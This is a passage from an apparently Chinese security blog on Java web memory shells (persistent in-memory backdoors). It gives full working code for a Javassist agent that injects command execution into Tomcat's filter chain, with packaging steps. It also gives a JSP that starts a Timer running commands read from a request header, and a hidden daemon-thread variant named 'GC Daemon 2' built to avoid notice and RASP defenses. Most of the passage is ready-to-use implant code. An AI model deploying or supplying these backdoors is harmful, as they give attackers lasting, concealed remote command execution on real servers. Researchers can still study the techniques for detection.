class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>在resources下创建 META-INF 目录，创建 MANIFEST.MF</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: ShellAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>在pom中配置 maven 的 assembly 插件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- get all project dependencies --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">&lt;!-- MainClass in mainfest make a executable jar --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-name</span>&gt;</span>$&#123;project.name&#125;<span class="tag">&lt;/<span class="name">Project-name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Project-version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">Project-version</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>ShellAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- bind to the packaging phase --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>使用assembly的插件下的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>或者命令行使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure></div>

<p>打包在target下会存在一个有依赖版本和无依赖版本</p>
<p>我们将 agent.jar 已经编写好了，接下来我们需要编写 java 代码来使其加载进去</p>
<p><del>然后配合Evil 类打字节马就行，但是tnnd又没成功，我真服了。。。后面再试吧，研究这个已经耽误2天了</del></p>
<p><del>这个比其他的要多使用一个jar包，挺麻烦的还</del></p>
<p>解决了，tnnd我真是个呆逼，恶意类又忘了继承 AbstractTranslet 类就加载字节码了，md今早上突然想起来了。。。。之前白辛苦搞那么久了，淦！</p>
<p><font color="red"><strong>下次一定一定要记得继承  AbstractTranslet 类！！！！！！！</strong></font></p>
<p>这个马也挺好用的</p>
<h2 id="十一、Timer-型内存马"><a href="#十一、Timer-型内存马" class="headerlink" title="十一、Timer 型内存马"></a>十一、Timer 型内存马</h2><p><a class="link"   href="https://su18.org/post/memory-shell-2/" >JavaWeb 内存马二周目通关攻略 | 素十八 (su18.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>而 jsp 的本质，就是 servlet。 jsp 创建了一个 Timer 计时器对象，在访问了一次这个 jsp 后，会启动一个计时器进行无限循环，一次执行直到服务器重启。即使将这个 jsp 删除，依旧是会继续进行这个任务。</p>
<p>这里依旧以 Tomcat 为例，按照 Servlet 的特点，一个 Servlet 在注册时会被封装成 <code>org.apache.catalina.core.StandardWrapper</code>，在其 mappings 中添加类名，并将访问路径及类名的映射关系存储在 <code>org.apache.catalina.core.StandardContext#servletMappings</code> 中。</p>
</blockquote>
<p><strong>而 jsp 的本质，就是 servlet，只不过由 Tomcat 实现了动态转换、编译、加载、执行的过程</strong></p>
<p>接下来看下 JspServlet 的处理逻辑，总体来说分为三步:</p>
<ol>
<li>JSP 引擎将 <code>.jsp</code> 文件翻译成一个 servlet 源代码;</li>
<li>将 servlet 源代码编译成 <code>.class</code> 文件;</li>
<li>加载并执行这个编译后的文件。</li>
</ol>
<p><strong>一个 jsp 的生命周期</strong></p>
<ol>
<li>在 <code>JspCompilationContext#compile</code> 方法中，会调用 <code>this.jspCompiler.isOutDated()</code> 判断文件状态；</li>
<li>方法根据 <code>JspCompilationContext#getLastModified</code> 方法判断 JSP 本地 resource 是否存在，如果不存在，则通过将 <code>JspCompilationContext#removed</code> 标识为 true 来代表了文件已经被移除；</li>
<li>调用 <code>JspRuntimeContext#removeWrapper</code> 从 <code>JspRuntimeContext#jsps</code> 中移除访问路径与 wrapper 的映射；</li>
<li>随后会抛出 FileNotFoundException 异常，终止后续的处理逻辑。</li>
<li>被移除的 wrapper 因为失去了引用，将会被等待 GC。</li>
</ol>
<p>按理说JSP 被删除后，对应的访问映射不存在了，实际执行的 servlet 实例和 wrapper 对象失去了引用将会等待销毁，被销毁后，里面的代码自然就失效了。</p>
<p><strong>但是由于在恶意代码创建了 Timer 定时任务，而 Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code> cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</strong></p>
<h3 id="恶意jsp"><a href="#恶意jsp" class="headerlink" title="恶意jsp"></a>恶意jsp</h3><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> HashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">    java.util.<span class="type">Timer</span> <span class="variable">executeSchedule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Timer();</span><br><span class="line">    executeSchedule.schedule(<span class="keyword">new</span> <span class="title class_">java</span>.util.TimerTask() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            List&lt;Object&gt; list = getRequest();</span><br><span class="line">            <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                    set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="线程型内存马"><a href="#线程型内存马" class="headerlink" title="线程型内存马"></a>线程型内存马</h3><p>根据以上的思考，可以发现，所谓的 Timer 型内存马，实际上就是想办法在服务器上启动一个永远不会被 GC 的线程，在此线程中定时或循环执行恶意代码，达到内存马的目的。</p>
<p>首先创建了一个独立于请求的线程，由这个线程里的动作用来实现恶意行为，这个线程里的行为不会自然终止，会持续运行直到 JVM 退出。</p>
<p>守护线程非常符合上述特征。新建线程的操作在攻击中有很多好处，其中之一就是可以绕过 RASP 类型的防御手段。</p>
<p>所以上面的 Timer 型内存马的关键代码可以修改为如下代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                    <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                target = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (List) getField(target, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                                target = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                threadName = (String) target.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(target, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line">                                <span class="keyword">if</span> (threadName != <span class="literal">null</span> &amp;&amp; !threadName.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">note</span> <span class="operator">=</span> target.getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, <span class="type">int</span>.class).invoke(target, <span class="number">1</span>);</span><br><span class="line">                                    <span class="type">Object</span>       <span class="variable">req</span>  <span class="operator">=</span> note.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(note);</span><br><span class="line">                                    List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                                    list.add(req);</span><br><span class="line">                                    list.add(threadName);</span><br><span class="line">                                    <span class="keyword">return</span> list;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新建线程，加入到 system 线程组中</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(getSystemThreadGroup(), <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 死循环</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 恶意逻辑</span></span><br><span class="line">                    List&lt;Object&gt; list = getRequest();</span><br><span class="line">                    <span class="keyword">if</span> (list.size() == <span class="number">2</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!set.contains(list.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                            set.add(list.get(<span class="number">0</span>));</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Runtime.getRuntime().exec(list.get(<span class="number">1</span>).toString());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// while true + sleep ，相当于 Timer 定时任务</span></span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 给线程起名叫 GC Daemon 2，没人会注意吧~</span></span><br><span class="line">    &#125;, <span class="string">&quot;GC Daemon 2&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设为守护线程</span></span><br><span class="line">    d.setDaemon(<span class="literal">true</span>);</span><br><span class="line">    d.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，我这里是创建了一个守护线程，命名为 “GC Daemon 2”，然后把它直接放在了 system 线程组中，用来隐蔽自己。线程中是跟 Timer 型内存马一样的循环执行 request 中带入的命令的逻辑。</p>
<h2 id="十二、JSP型内存马"><a href="#十二、JSP型内存马" class="headerlink" title="十二、JSP型内存马"></a>十二、JSP型内存马</h2><p><a class="link"   href="https://xz.aliyun.com/t/10372" >JSP内存马研究 - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/224698" >Tomcat容器攻防笔记之JSP金蝉脱壳-安全客 - 安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在上述 Timer 内存马的分析流程中，涉及到了 JSP 的处理流程。虽然现在知道 Timer 型内存马本身跟 JSP 没太大关系，但是还是发现了可以实现类似 Servlet-API 型内存马的新方式——也就是JSP型内存马。</p>
<p>jsp与之前我们讨论的 Servlet 型内存马类似，我们可以自己创建对应的类放在相应的位置。此处的重点在于如何绕过访问时的对于 JSP 状态一些判断。在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
<p><strong>jsp加载大致流程</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">JspServlet#service 				//主要的功能是接收请求的URL，判断是否预编译 	-&gt; </span><br><span class="line">  JspServlet#serviceJspFile		//preCompile中当请求参数以jsp_precompile开始会进行预编译,默认情况下也不会预编译。 -&gt;</span><br><span class="line">  JspServletWrapper#service		//编译class，将其注册为servlet，调用servlet.servlet</span><br><span class="line">    Options#getDevelopment		//进行编译class</span><br><span class="line">      JspCompilationContext#compile	//判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件</span><br><span class="line">    JspServletWrapper#getServlet()	//注册servlet</span><br><span class="line">    Servlet.service				//至此完成</span><br></pre></td></tr></table></figure></div>

